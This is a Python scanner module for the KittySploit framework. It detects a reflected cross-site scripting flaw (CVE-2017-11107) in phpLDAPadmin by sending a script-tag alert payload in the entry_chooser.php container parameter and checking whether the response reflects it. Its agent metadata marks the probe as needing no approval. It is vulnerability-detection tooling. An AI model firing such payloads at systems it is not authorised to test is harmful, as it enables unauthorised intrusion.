#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""phpLDAPadmin <= 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpLDAPadmin <= 1.2.3 - Reflected XSS Detection',
        'description': 'phpLDAPadmin <= 1.2.3 contains a reflected cross-site scripting caused by unsanitized input in htdocs/entry_chooser.php via the form, element, rdn, or container parameter, letting attackers execute malicious scripts in victim browsers, exploit requires sending crafted input.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'phpldapadmin', 'xss', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-11107',
            'https://github.com/leenooks/phpLDAPadmin/issues/50',
            'https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=867719',
        ],
        'cve': 'CVE-2017-11107',
    }

    def run(self):
        path = '/phpldapadmin/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('phpLDAPadmin',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/phpldapadmin/entry_chooser.php?container=%3Cscript%3Ealert(document.domain)%3C/script%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('<script>alert(document.domain)</script>', 'Entry Chooser',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='phpLDAPadmin <= 1.2.3 - Reflected XSS detected', path=path)
            return True
        return False

